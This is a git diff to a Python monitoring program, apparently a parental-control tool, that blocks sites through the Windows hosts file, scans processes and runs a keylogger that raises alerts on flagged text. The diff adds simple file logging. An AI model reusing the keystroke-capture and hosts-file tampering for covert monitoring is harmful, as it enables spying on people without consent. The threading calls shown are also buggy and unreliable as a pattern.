@@ -15,6 +15,10 @@ from IPy import IP  # For Scanner
 
 SEND_REPORT_EVERY = 30
 
+def logging(text):
+    arquivo = open("logs.txt", 'a')
+    arquivo.writelines(text + "\n")
+    arquivo.close()
 
 def block_DNS():
     path = r"C:\Windows\System32\drivers\etc\hosts"
@@ -23,7 +27,7 @@ def block_DNS():
     with open('sites.txt') as file:
         contents = file.read().split(';')
         for row in contents:
-            websites.append(row[0])
+            websites.append(row)
     with open(path, 'r+') as file:
         content = file.read()
         for site in websites:
@@ -31,6 +35,7 @@ def block_DNS():
                 pass
             else:
                 file.write(redirect + " " + site + "\n")
+    logging("DNS")
 
 
 def isHateSpeech(self):
@@ -151,6 +156,7 @@ class Keylogger:
 
     def report(self):
         if self.log and (isHateSpeech(self) or isBadLanguage(self) or areMaliciousProcess(self)):
+            logging("report")
             sendAlert(self)
 
         self.log = ""
@@ -209,8 +215,11 @@ class Scanner:
 
 
 if __name__ == "__main__":
-    threading.Thread(target=block_DNS()).start()
+    logging("INICIO")
+    #threading.Thread(target=block_DNS()).start()
     scanner = Scanner()
     threading.Thread(scanner.scan()).start()
+    logging("scanner")
     keylogger = Keylogger(interval=SEND_REPORT_EVERY)
     keylogger.start()
+    logging("keylogger")
